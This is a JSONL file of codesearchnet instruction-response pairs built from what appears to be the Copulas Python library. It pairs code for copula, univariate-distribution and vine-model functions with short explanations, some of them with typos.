{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef sample(self, num_rows=1):\n        self.check_fit()\n\n        res = {}\n        means = np.zeros(self.covariance.shape[0])\n        size = (num_rows,)\n\n        clean_cov = np.nan_to_num(self.covariance)\n        samples = np.random.multivariate_normal(means, clean_cov, size=size)\n\n        for i, (label, distrib) in enumerate(self.distribs.items()):\n            cdf = stats.norm.cdf(samples[:, i])\n            res[label] = distrib.percent_point(cdf)\n\n        return pd.DataFrame(data=res)", "response": "Creates sintentic values stadistically similar to the original dataset."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef from_dict(cls, copula_dict):\n        instance = cls()\n        instance.distribs = {}\n\n        for name, parameters in copula_dict['distribs'].items():\n            instance.distribs[name] = Univariate.from_dict(parameters)\n\n        instance.covariance = np.array(copula_dict['covariance'])\n        instance.fitted = copula_dict['fitted']\n        instance.distribution = copula_dict['distribution']\n        return instance", "response": "Set attributes with provided values."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nfitting the model. Arguments: X: `np.ndarray` of shape (n, 1). Returns: None", "response": "def fit(self, X):\n        \"\"\"Fit the model.\n\n        Arguments:\n            X: `np.ndarray` of shape (n, 1).\n\n        Returns:\n            None\n        \"\"\"\n        if isinstance(X, (pd.Series, pd.DataFrame)):\n            self.name = X.name\n\n        self.constant_value = self._get_constant_value(X)\n\n        if self.constant_value is None:\n            self.mean = np.mean(X)\n            self.std = np.std(X)\n\n        else:\n            self._replace_constant_methods()\n\n        self.fitted = True"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncompute probability density of a set of items in the n - th product.", "response": "def probability_density(self, X):\n        \"\"\"Compute probability density.\n\n        Arguments:\n            X: `np.ndarray` of shape (n, 1).\n\n        Returns:\n            np.ndarray\n        \"\"\"\n        self.check_fit()\n        return norm.pdf(X, loc=self.mean, scale=self.std)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef percent_point(self, U):\n        self.check_fit()\n        return norm.ppf(U, loc=self.mean, scale=self.std)", "response": "Given a cumulated distribution value returns a value in original space."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef sample(self, num_samples=1):\n        self.check_fit()\n        return np.random.normal(self.mean, self.std, num_samples)", "response": "Returns a random np. ndarray of n_samples data points based on model."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef from_dict(cls, copula_dict):\n        instance = cls()\n        instance.fitted = copula_dict['fitted']\n        instance.constant_value = copula_dict['constant_value']\n\n        if instance.fitted and instance.constant_value is None:\n            instance.mean = copula_dict['mean']\n            instance.std = copula_dict['std']\n\n        return instance", "response": "Set attributes with provided values."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef fit(self, X):\n        U, V = self.split_matrix(X)\n        self.tau = stats.kendalltau(U, V)[0]\n        self.theta = self.compute_theta()\n        self.check_theta()", "response": "Fit a model to the data updating the parameters."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef from_dict(cls, copula_dict):\n        instance = cls(copula_dict['copula_type'])\n        instance.theta = copula_dict['theta']\n        instance.tau = copula_dict['tau']\n        return instance", "response": "Create a new instance of the class from a dictionary."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncomputes partial derivative of cumulative density of single values.", "response": "def partial_derivative_scalar(self, U, V, y=0):\n        \"\"\"Compute partial derivative :math:`C(u|v)` of cumulative density of single values.\"\"\"\n\n        self.check_fit()\n\n        X = np.column_stack((U, V))\n        return self.partial_derivative(X, y)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef sample(self, n_samples):\n        if self.tau > 1 or self.tau < -1:\n            raise ValueError(\"The range for correlation measure is [-1,1].\")\n\n        v = np.random.uniform(0, 1, n_samples)\n        c = np.random.uniform(0, 1, n_samples)\n\n        u = self.percent_point(c, v)\n        return np.column_stack((u, v))", "response": "Generate specified n_samples of new data from the model."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nvalidate the computed theta against the copula specification.", "response": "def check_theta(self):\n        \"\"\"Validate the computed theta against the copula specification.\n\n        This method is used to assert the computed theta is in the valid range for the copula.\"\"\"\n        lower, upper = self.theta_interval\n        if (not lower <= self.theta <= upper) or (self.theta in self.invalid_thetas):\n            message = 'The computed theta value {} is out of limits for the given {} copula.'\n            raise ValueError(message.format(self.theta, self.copula_type.name))"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef select_copula(cls, X):\n        frank = Bivariate(CopulaTypes.FRANK)\n        frank.fit(X)\n\n        if frank.tau <= 0:\n            selected_theta = frank.theta\n            selected_copula = CopulaTypes.FRANK\n            return selected_copula, selected_theta\n\n        copula_candidates = [frank]\n        theta_candidates = [frank.theta]\n\n        try:\n            clayton = Bivariate(CopulaTypes.CLAYTON)\n            clayton.fit(X)\n            copula_candidates.append(clayton)\n            theta_candidates.append(clayton.theta)\n        except ValueError:\n            # Invalid theta, copula ignored\n            pass\n\n        try:\n            gumbel = Bivariate(CopulaTypes.GUMBEL)\n            gumbel.fit(X)\n            copula_candidates.append(gumbel)\n            theta_candidates.append(gumbel.theta)\n        except ValueError:\n            # Invalid theta, copula ignored\n            pass\n\n        z_left, L, z_right, R = cls.compute_empirical(X)\n        left_dependence, right_dependence = cls.get_dependencies(\n            copula_candidates, z_left, z_right)\n\n        # compute L2 distance from empirical distribution\n        cost_L = [np.sum((L - l) ** 2) for l in left_dependence]\n        cost_R = [np.sum((R - r) ** 2) for r in right_dependence]\n        cost_LR = np.add(cost_L, cost_R)\n\n        selected_copula = np.argmax(cost_LR)\n        selected_theta = theta_candidates[selected_copula]\n        return CopulaTypes(selected_copula), selected_theta", "response": "Select best copula function based on likelihood of empirical distribution."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef load(cls, copula_path):\n        with open(copula_path) as f:\n            copula_dict = json.load(f)\n\n        return cls.from_dict(copula_dict)", "response": "Create a new instance from a file."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nimport an object from its Fully Qualified Name.", "response": "def import_object(object_name):\n    \"\"\"Import an object from its Fully Qualified Name.\"\"\"\n    package, name = object_name.rsplit('.', 1)\n    return getattr(importlib.import_module(package), name)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns the Fully Qualified Name from an instance or class.", "response": "def get_qualified_name(_object):\n    \"\"\"Return the Fully Qualified Name from an instance or class.\"\"\"\n    module = _object.__module__\n    if hasattr(_object, '__name__'):\n        _class = _object.__name__\n\n    else:\n        _class = _object.__class__.__name__\n\n    return module + '.' + _class"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nallows a method that only accepts scalars to accept vectors too.", "response": "def vectorize(function):\n    \"\"\"Allow a method that only accepts scalars to accept vectors too.\n\n    This decorator has two different behaviors depending on the dimensionality of the\n    array passed as an argument:\n\n    **1-d array**\n\n    It will work under the assumption that the `function` argument is a callable\n    with signature::\n\n        function(self, X, *args, **kwargs)\n\n    where X is an scalar magnitude.\n\n    In this case the arguments of the input array will be given one at a time, and\n    both the input and output of the decorated function will have shape (n,).\n\n    **2-d array**\n\n    It will work under the assumption that the `function` argument is a callable with signature::\n\n        function(self, X0, ..., Xj, *args, **kwargs)\n\n    where `Xi` are scalar magnitudes.\n\n    It will pass the contents of each row unpacked on each call. The input is espected to have\n    shape (n, j), the output a shape of (n,)\n\n    It will return a function that is guaranteed to return a `numpy.array`.\n\n    Args:\n        function(callable): Function that only accept and return scalars.\n\n    Returns:\n        callable: Decorated function that can accept and return :attr:`numpy.array`.\n\n    \"\"\"\n\n    def decorated(self, X, *args, **kwargs):\n        if not isinstance(X, np.ndarray):\n            return function(self, X, *args, **kwargs)\n\n        if len(X.shape) == 1:\n            X = X.reshape([-1, 1])\n\n        if len(X.shape) == 2:\n            return np.fromiter(\n                (function(self, *x, *args, **kwargs) for x in X),\n                np.dtype('float64')\n            )\n\n        else:\n            raise ValueError('Arrays of dimensionality higher than 2 are not supported.')\n\n    decorated.__doc__ = function.__doc__\n    return decorated"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef scalarize(function):\n    def decorated(self, X, *args, **kwargs):\n        scalar = not isinstance(X, np.ndarray)\n\n        if scalar:\n            X = np.array([X])\n\n        result = function(self, X, *args, **kwargs)\n        if scalar:\n            result = result[0]\n\n        return result\n\n    decorated.__doc__ = function.__doc__\n    return decorated", "response": "Decorator that allows methods that only accepts 1 - d vectors to work with scalars."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nraise an exception if the given values are not supported. Args: function(callable): Method whose unique argument is a numpy.array-like object. Returns: callable: Decorated function Raises: ValueError: If there are missing or invalid values or if the dataset is empty.", "response": "def check_valid_values(function):\n    \"\"\"Raises an exception if the given values are not supported.\n\n    Args:\n        function(callable): Method whose unique argument is a numpy.array-like object.\n\n    Returns:\n        callable: Decorated function\n\n    Raises:\n        ValueError: If there are missing or invalid values or if the dataset is empty.\n    \"\"\"\n    def decorated(self, X, *args, **kwargs):\n\n        if isinstance(X, pd.DataFrame):\n            W = X.values\n\n        else:\n            W = X\n\n        if not len(W):\n            raise ValueError('Your dataset is empty.')\n\n        if W.dtype not in [np.dtype('float64'), np.dtype('int64')]:\n            raise ValueError('There are non-numerical values in your data.')\n\n        if np.isnan(W).any().any():\n            raise ValueError('There are nan values in your data.')\n\n        return function(self, X, *args, **kwargs)\n\n    return decorated"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nraises a detailed exception when a method is not available.", "response": "def missing_method_scipy_wrapper(function):\n    \"\"\"Raises a detailed exception when a method is not available.\"\"\"\n    def decorated(self, *args, **kwargs):\n        message = (\n            'Your tried to access `{method_name}` from {class_name}, but its not available.\\n '\n            'There can be multiple factors causing this, please feel free to open an issue in '\n            'https://github.com/DAI-Lab/Copulas/issues/new'\n        )\n\n        params = {\n            'method_name': function.__name__,\n            'class_name': get_qualified_name(function.__self__.__class__)\n        }\n\n        raise NotImplementedError(message.format(**params))\n\n    return decorated"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn the generator function.", "response": "def generator(self, t):\n        \"\"\"Return the generator function.\"\"\"\n        a = (np.exp(-self.theta * t) - 1) / (np.exp(-self.theta) - 1)\n        return -np.log(a)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _g(self, z):\n        return np.exp(np.multiply(-self.theta, z)) - 1", "response": "Helper function to solve Frank copula.\n           "}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncompute density function for given copula family.", "response": "def probability_density(self, X):\n        \"\"\"Compute density function for given copula family.\n\n        Args:\n            X: `np.ndarray`\n\n        Returns:\n            np.array: probability density\n        \"\"\"\n        self.check_fit()\n\n        U, V = self.split_matrix(X)\n\n        if self.theta == 0:\n            return np.multiply(U, V)\n\n        else:\n            num = np.multiply(np.multiply(-self.theta, self._g(1)), 1 + self._g(np.add(U, V)))\n            aux = np.multiply(self._g(U), self._g(V)) + self._g(1)\n            den = np.power(aux, 2)\n            return num / den"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ncomputes the cumulative distribution function for the copula.", "response": "def cumulative_distribution(self, X):\n        \"\"\"Computes the cumulative distribution function for the copula, :math:`C(u, v)`\n\n        Args:\n            X: `np.ndarray`\n\n        Returns:\n            np.array: cumulative distribution\n        \"\"\"\n        self.check_fit()\n\n        U, V = self.split_matrix(X)\n\n        num = np.multiply(\n            np.exp(np.multiply(-self.theta, U)) - 1,\n            np.exp(np.multiply(-self.theta, V)) - 1\n        )\n        den = np.exp(-self.theta) - 1\n\n        return -1.0 / self.theta * np.log(1 + num / den)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef percent_point(self, y, V):\n        self.check_fit()\n\n        if self.theta < 0:\n            return V\n\n        else:\n            result = []\n            for _y, _V in zip(y, V):\n                minimum = fminbound(self.partial_derivative_scalar, EPSILON, 1.0, args=(_y, _V))\n                if isinstance(minimum, np.ndarray):\n                    minimum = minimum[0]\n\n                result.append(minimum)\n\n            return np.array(result)", "response": "Compute the inverse of conditional cumulative distribution."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncompute the partial derivative of the cumulative distribution.", "response": "def partial_derivative(self, X, y=0):\n        \"\"\"Compute partial derivative :math:`C(u|v)` of cumulative distribution.\n\n        Args:\n            X: `np.ndarray`\n            y: `float`\n\n        Returns:\n            np.ndarray\n        \"\"\"\n        self.check_fit()\n\n        U, V = self.split_matrix(X)\n\n        if self.theta == 0:\n            return V\n\n        else:\n            num = np.multiply(self._g(U), self._g(V)) + self._g(U)\n            den = np.multiply(self._g(U), self._g(V)) + self._g(1)\n            return (num / den) - y"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncomputing first order debye function to estimate theta.", "response": "def _frank_help(alpha, tau):\n        \"\"\"Compute first order debye function to estimate theta.\"\"\"\n\n        def debye(t):\n            return t / (np.exp(t) - 1)\n\n        debye_value = integrate.quad(debye, EPSILON, alpha)[0] / alpha\n        return 4 * (debye_value - 1) / alpha + 1 - tau"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef to_dict(self):\n        result = {\n            'type': get_qualified_name(self),\n            'fitted': self.fitted,\n            'constant_value': self.constant_value\n        }\n\n        if not self.fitted:\n            return result\n\n        result.update(self._fit_params())\n        return result", "response": "Returns parameters to replicate the distribution."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncomputing the cumulative distribution for the degenerate case of constant distribution.", "response": "def _constant_cumulative_distribution(self, X):\n        \"\"\"Cumulative distribution for the degenerate case of constant distribution.\n\n        Note that the output of this method will be an array whose unique values are 0 and 1.\n        More information can be found here: https://en.wikipedia.org/wiki/Degenerate_distribution\n\n        Args:\n            X (numpy.ndarray): Values to compute cdf to.\n\n        Returns:\n            numpy.ndarray: Cumulative distribution for the given values.\n        \"\"\"\n        result = np.ones(X.shape)\n        result[np.nonzero(X < self.constant_value)] = 0\n\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn the probability density for the degenerate case of constant distribution.", "response": "def _constant_probability_density(self, X):\n        \"\"\"Probability density for the degenerate case of constant distribution.\n\n        Note that the output of this method will be an array whose unique values are 0 and 1.\n        More information can be found here: https://en.wikipedia.org/wiki/Degenerate_distribution\n\n        Args:\n            X(numpy.ndarray): Values to compute pdf.\n\n        Returns:\n            numpy.ndarray: Probability densisty for the given values\n        \"\"\"\n        result = np.zeros(X.shape)\n        result[np.nonzero(X == self.constant_value)] = 1\n\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _replace_constant_methods(self):\n        self.cumulative_distribution = self._constant_cumulative_distribution\n        self.percent_point = self._constant_percent_point\n        self.probability_density = self._constant_probability_density\n        self.sample = self._constant_sample", "response": "Replaces conventional distribution methods by its constant counterparts."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nfits scipy model to an array of values.", "response": "def fit(self, X, *args, **kwargs):\n        \"\"\"Fit scipy model to an array of values.\n\n        Args:\n            X(`np.ndarray` or `pd.DataFrame`):  Datapoints to be estimated from. Must be 1-d\n\n        Returns:\n            None\n        \"\"\"\n\n        self.constant_value = self._get_constant_value(X)\n\n        if self.constant_value is None:\n            if self.unfittable_model:\n                self.model = getattr(scipy.stats, self.model_class)(*args, **kwargs)\n            else:\n                self.model = getattr(scipy.stats, self.model_class)(X, *args, **kwargs)\n\n            for name in self.METHOD_NAMES:\n                attribute = getattr(self.__class__, name)\n                if isinstance(attribute, str):\n                    setattr(self, name, getattr(self.model, attribute))\n\n                elif attribute is None:\n                    setattr(self, name, missing_method_scipy_wrapper(lambda x: x))\n\n        else:\n            self._replace_constant_methods()\n\n        self.fitted = True"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef generator(self, t):\n        return np.power(-np.log(t), self.theta)", "response": "Return the generator function."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ncomputes density function for given copula family X.", "response": "def probability_density(self, X):\n        \"\"\"Compute density function for given copula family.\"\"\"\n        self.check_fit()\n\n        U, V = self.split_matrix(X)\n\n        if self.theta == 1:\n            return np.multiply(U, V)\n\n        else:\n            a = np.power(np.multiply(U, V), -1)\n            tmp = np.power(-np.log(U), self.theta) + np.power(-np.log(V), self.theta)\n            b = np.power(tmp, -2 + 2.0 / self.theta)\n            c = np.power(np.multiply(np.log(U), np.log(V)), self.theta - 1)\n            d = 1 + (self.theta - 1) * np.power(tmp, -1.0 / self.theta)\n            return self.cumulative_distribution(X) * a * b * c * d"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef cumulative_distribution(self, X):\n        self.check_fit()\n\n        U, V = self.split_matrix(X)\n\n        if self.theta == 1:\n            return np.multiply(U, V)\n\n        else:\n            h = np.power(-np.log(U), self.theta) + np.power(-np.log(V), self.theta)\n            h = -np.power(h, 1.0 / self.theta)\n            cdfs = np.exp(h)\n            return cdfs", "response": "Computes the cumulative distribution function for the copula."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef partial_derivative(self, X, y=0):\n        self.check_fit()\n\n        U, V = self.split_matrix(X)\n\n        if self.theta == 1:\n            return V\n\n        else:\n            t1 = np.power(-np.log(U), self.theta)\n            t2 = np.power(-np.log(V), self.theta)\n            p1 = self.cumulative_distribution(X)\n            p2 = np.power(t1 + t2, -1 + 1.0 / self.theta)\n            p3 = np.power(-np.log(V), self.theta - 1)\n            return np.divide(np.multiply(np.multiply(p1, p2), p3), V) - y", "response": "Compute the partial derivative of the cumulative density."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef main(data, utype, ctype):\n    copula = CopulaModel(data, utype, ctype)\n    print(copula.sampling(1, plot=True))\n    print(copula.model.vine_model[-1].tree_data)", "response": "Create a Vine from the data utype and ctype"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef generator(self, t):\n        self.check_fit()\n\n        return (1.0 / self.theta) * (np.power(t, -self.theta) - 1)", "response": "Return the generator function."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncomputes the probability density function for given copula family.", "response": "def probability_density(self, X):\n        \"\"\"Compute probability density function for given copula family.\n\n        Args:\n            X: `np.ndarray`\n\n        Returns:\n            np.array: Probability density for the input values.\n        \"\"\"\n        self.check_fit()\n\n        U, V = self.split_matrix(X)\n\n        a = (self.theta + 1) * np.power(np.multiply(U, V), -(self.theta + 1))\n        b = np.power(U, -self.theta) + np.power(V, -self.theta) - 1\n        c = -(2 * self.theta + 1) / self.theta\n        return a * np.power(b, c)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef cumulative_distribution(self, X):\n        self.check_fit()\n\n        U, V = self.split_matrix(X)\n\n        if (V == 0).all() or (U == 0).all():\n            return np.zeros(V.shape[0])\n\n        else:\n            cdfs = [\n                np.power(\n                    np.power(U[i], -self.theta) + np.power(V[i], -self.theta) - 1,\n                    -1.0 / self.theta\n                )\n                if (U[i] > 0 and V[i] > 0) else 0\n                for i in range(len(U))\n            ]\n\n            return np.array([max(x, 0) for x in cdfs])", "response": "Computes the cumulative distribution function for the copula X."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef percent_point(self, y, V):\n        self.check_fit()\n\n        if self.theta < 0:\n            return V\n\n        else:\n            a = np.power(y, self.theta / (-1 - self.theta))\n            b = np.power(V, self.theta)\n            u = np.power((a + b - 1) / b, -1 / self.theta)\n            return u", "response": "Compute the inverse of conditional cumulative distribution."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef partial_derivative(self, X, y=0):\n        self.check_fit()\n\n        U, V = self.split_matrix(X)\n\n        if self.theta == 0:\n            return V\n\n        else:\n            A = np.power(V, -self.theta - 1)\n            B = np.power(V, -self.theta) + np.power(U, -self.theta) - 1\n            h = np.power(B, (-1 - self.theta) / self.theta)\n            return np.multiply(A, h) - y", "response": "Compute the partial derivative of the cumulative distribution."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncomputing theta parameter using Kendall s tau.", "response": "def compute_theta(self):\n        \"\"\"Compute theta parameter using Kendall's tau.\n\n        On Clayton copula this is :math:`\u03c4 = \u03b8/(\u03b8 + 2) \\\\implies \u03b8 = 2\u03c4/(1-\u03c4)` with\n        :math:`\u03b8 \u2208 (0, \u221e)`.\n\n        On the corner case of :math:`\u03c4 = 1`, a big enough number is returned instead of infinity.\n        \"\"\"\n        if self.tau == 1:\n            theta = 10000\n\n        else:\n            theta = 2 * self.tau / (1 - self.tau)\n\n        return theta"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef fit(self, X):\n        min_ = X.min() - EPSILON\n        max_ = X.max() + EPSILON\n        self.mean = X.mean()\n        self.std = X.std()\n\n        super().fit(X, min_, max_)", "response": "Prepare necessary params and call super. fit."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef from_dict(cls, parameters):\n        instance = cls()\n        instance.fitted = parameters['fitted']\n        instance.constant_value = parameters['constant_value']\n\n        if instance.fitted and instance.constant_value is None:\n            instance.model = scipy.stats.truncnorm(parameters['a'], parameters['b'])\n\n        return instance", "response": "Create an instance of this class from a dictionary containing instance parameters."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nfits a vine model to the data.", "response": "def fit(self, X, truncated=3):\n        \"\"\"Fit a vine model to the data.\n\n        Args:\n            X(numpy.ndarray): data to be fitted.\n            truncated(int): max level to build the vine.\n        \"\"\"\n        self.n_sample, self.n_var = X.shape\n        self.columns = X.columns\n        self.tau_mat = X.corr(method='kendall').values\n        self.u_matrix = np.empty([self.n_sample, self.n_var])\n\n        self.truncated = truncated\n        self.depth = self.n_var - 1\n        self.trees = []\n\n        self.unis, self.ppfs = [], []\n        for i, col in enumerate(X):\n            uni = self.model()\n            uni.fit(X[col])\n            self.u_matrix[:, i] = uni.cumulative_distribution(X[col])\n            self.unis.append(uni)\n            self.ppfs.append(uni.percent_point)\n\n        self.train_vine(self.vine_type)\n        self.fitted = True"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncomputing likelihood of the vine.", "response": "def get_likelihood(self, uni_matrix):\n        \"\"\"Compute likelihood of the vine.\"\"\"\n        num_tree = len(self.trees)\n        values = np.empty([1, num_tree])\n\n        for i in range(num_tree):\n            value, new_uni_matrix = self.trees[i].get_likelihood(uni_matrix)\n            uni_matrix = new_uni_matrix\n            values[0, i] = value\n\n        return np.sum(values)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ngenerate a single row from vine model.", "response": "def _sample_row(self):\n        \"\"\"Generate a single sampled row from vine model.\n\n        Returns:\n            numpy.ndarray\n        \"\"\"\n        unis = np.random.uniform(0, 1, self.n_var)\n        # randomly select a node to start with\n        first_ind = np.random.randint(0, self.n_var)\n        adj = self.trees[0].get_adjacent_matrix()\n        visited = []\n        explore = [first_ind]\n\n        sampled = np.zeros(self.n_var)\n        itr = 0\n        while explore:\n            current = explore.pop(0)\n            neighbors = np.where(adj[current, :] == 1)[0].tolist()\n            if itr == 0:\n                new_x = self.ppfs[current](unis[current])\n\n            else:\n                for i in range(itr - 1, -1, -1):\n                    current_ind = -1\n\n                    if i >= self.truncated:\n                        continue\n\n                    current_tree = self.trees[i].edges\n                    # get index of edge to retrieve\n                    for edge in current_tree:\n                        if i == 0:\n                            if (edge.L == current and edge.R == visited[0]) or\\\n                               (edge.R == current and edge.L == visited[0]):\n                                current_ind = edge.index\n                                break\n                        else:\n                            if edge.L == current or edge.R == current:\n                                condition = set(edge.D)\n                                condition.add(edge.L)\n                                condition.add(edge.R)\n\n                                visit_set = set(visited)\n                                visit_set.add(current)\n\n                                if condition.issubset(visit_set):\n                                    current_ind = edge.index\n                                break\n\n                    if current_ind != -1:\n                        # the node is not indepedent contional on visited node\n                        copula_type = current_tree[current_ind].name\n                        copula = Bivariate(CopulaTypes(copula_type))\n                        copula.theta = current_tree[current_ind].theta\n                        derivative = copula.partial_derivative_scalar\n\n                        if i == itr - 1:\n                            tmp = optimize.fminbound(\n                                derivative, EPSILON, 1.0,\n                                args=(unis[visited[0]], unis[current])\n                            )\n                        else:\n                            tmp = optimize.fminbound(\n                                derivative, EPSILON, 1.0,\n                                args=(unis[visited[0]], tmp)\n                            )\n\n                        tmp = min(max(tmp, EPSILON), 0.99)\n\n                new_x = self.ppfs[current](tmp)\n\n            sampled[current] = new_x\n\n            for s in neighbors:\n                if s not in visited:\n                    explore.insert(0, s)\n\n            itr += 1\n            visited.insert(0, current)\n\n        return sampled"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nsamples new rows. Args: num_rows(int): Number of rows to sample Returns: pandas.DataFrame", "response": "def sample(self, num_rows):\n        \"\"\"Sample new rows.\n\n        Args:\n            num_rows(int): Number of rows to sample\n\n        Returns:\n            pandas.DataFrame\n        \"\"\"\n\n        sampled_values = []\n        for i in range(num_rows):\n            sampled_values.append(self._sample_row())\n\n        return pd.DataFrame(sampled_values, columns=self.columns)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef fit(self, index, n_nodes, tau_matrix, previous_tree, edges=None):\n        self.level = index + 1\n        self.n_nodes = n_nodes\n        self.tau_matrix = tau_matrix\n        self.previous_tree = previous_tree\n        self.edges = edges or []\n\n        if not self.edges:\n            if self.level == 1:\n                self.u_matrix = previous_tree\n                self._build_first_tree()\n\n            else:\n                self._build_kth_tree()\n\n            self.prepare_next_tree()\n\n        self.fitted = True", "response": "Fits tree object.\n\n        Args:\n            :param index: index of the tree\n            :param n_nodes: number of nodes in the tree\n            :tau_matrix: kendall's tau matrix of the data\n            :previous_tree: tree object of previous level\n            :type index: int\n            :type n_nodes: int\n            :type tau_matrix: np.ndarray of size n_nodes*n_nodes"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nchecks if two edges satisfy vine constraint.", "response": "def _check_contraint(self, edge1, edge2):\n        \"\"\"Check if two edges satisfy vine constraint.\n\n        Args:\n            :param edge1: edge object representing edge1\n            :param edge2: edge object representing edge2\n            :type edge1: Edge object\n            :type edge2: Edge object\n\n        Returns:\n            Boolean True if the two edges satisfy vine constraints\n        \"\"\"\n        full_node = set([edge1.L, edge1.R, edge2.L, edge2.R])\n        full_node.update(edge1.D)\n        full_node.update(edge2.D)\n        return len(full_node) == (self.level + 1)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngetting neighboring edges for each edge in the edges.", "response": "def _get_constraints(self):\n        \"\"\"Get neighboring edges for each edge in the edges.\"\"\"\n        num_edges = len(self.edges)\n        for k in range(num_edges):\n            for i in range(num_edges):\n                # add to constraints if i shared an edge with k\n                if k != i and self.edges[k].is_adjacent(self.edges[i]):\n                    self.edges[k].neighbors.append(i)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _sort_tau_by_y(self, y):\n        # first column is the variable of interest\n        tau_y = self.tau_matrix[:, y]\n        tau_y[y] = np.NaN\n\n        temp = np.empty([self.n_nodes, 3])\n        temp[:, 0] = np.arange(self.n_nodes)\n        temp[:, 1] = tau_y\n        temp[:, 2] = abs(tau_y)\n        temp[np.isnan(temp)] = -10\n        tau_sorted = temp[temp[:, 2].argsort()[::-1]]\n\n        return tau_sorted", "response": "Sort tau matrix by variable y."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngets tau matrix for adjacent pairs.", "response": "def get_tau_matrix(self):\n        \"\"\"Get tau matrix for adjacent pairs.\n\n        Returns:\n            :param tau: tau matrix for the current tree\n            :type tau: np.ndarray\n        \"\"\"\n        num_edges = len(self.edges)\n        tau = np.empty([num_edges, num_edges])\n\n        for i in range(num_edges):\n            edge = self.edges[i]\n            for j in edge.neighbors:\n                if self.level == 1:\n                    left_u = self.u_matrix[:, edge.L]\n                    right_u = self.u_matrix[:, edge.R]\n\n                else:\n                    left_parent, right_parent = edge.parents\n                    left_u, right_u = Edge.get_conditional_uni(left_parent, right_parent)\n\n                tau[i, j], pvalue = scipy.stats.kendalltau(left_u, right_u)\n\n        return tau"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nget adjacency matrix. Returns: :param adj: adjacency matrix :type adj: np.ndarray", "response": "def get_adjacent_matrix(self):\n        \"\"\"Get adjacency matrix.\n\n        Returns:\n            :param adj: adjacency matrix\n            :type adj: np.ndarray\n        \"\"\"\n        edges = self.edges\n        num_edges = len(edges) + 1\n        adj = np.zeros([num_edges, num_edges])\n\n        for k in range(num_edges - 1):\n            adj[edges[k].L, edges[k].R] = 1\n            adj[edges[k].R, edges[k].L] = 1\n\n        return adj"}
